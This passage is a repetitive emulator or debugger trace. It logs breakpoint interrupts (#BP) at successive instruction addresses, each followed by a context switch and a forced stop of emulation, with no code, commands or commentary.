operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c23c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c24e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c263, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c263, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c263, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c27b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c28c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c297, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c2a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c2c7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c2df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c2f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c30f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c321, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c341, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c350, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c358, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c36d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c37e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c389, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c395, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c39f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c3b2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c3c4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c3db, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c3f5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c475, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c47c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c47c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c47c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c499, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c4a8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c4bf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c4db, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c4f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c500, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c527, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c538, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c54d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c560, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c572, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c58d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5a0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5c6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5db, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5e5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c5f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c603, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c621, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c62d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c650, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c669, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c67d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c695, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c69d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c6a9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c6c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c6d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c6e8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c6f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c767, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c76c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c77d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c786, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c78e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c7a1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c7c8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c7da, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c7f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c807, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c816, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c81d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c82c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c837, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c837, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c837, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c845, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c85c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c860, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c876, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c88c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c894, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c8a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c8c1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c8dc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c8fb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c90d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c912, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c912, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c912, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c923, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45babd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bace, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bae6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45baff, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bb14, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bb32, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bb44, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bb57, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bbe4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bbf8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc16, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc2e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc35, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc3c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc3c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc3c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc4a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc58, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc73, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bc94, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bca5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bcb6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bcbe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bceb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bcfc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd08, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd11, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd2a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd36, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd4a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd5d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd77, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd8b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bd96, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bda7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bdb1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bdbe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bdd3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bde2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45bdf8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45be0e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45be21, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458378, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458384, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458396, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583a0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583ad, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583be, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4583fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458408, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458421, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458429, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45843a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458454, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45846e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458477, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45849e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584af, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584dd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4584e4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458502, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458517, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458528, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458538, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458554, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458573, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458573, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458573, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45858e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45859b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4585aa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4585c8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4585db, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458659, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45866a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45867c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45868a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45868e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586c0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586c0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586c0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586d8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4586ec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458705, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45870e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45871a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458729, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458742, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458764, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458775, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458782, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458793, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458798, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587a6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587cc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587d6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587dc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587e0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4587fc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458804, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458822, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458837, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45884d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458860, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458875, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45888b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458896, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4588a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4588bc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4588c6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4588ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4588e8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45898d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45899a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589a7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589c0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589c9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589e3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4589fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a16, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a26, cs = 23 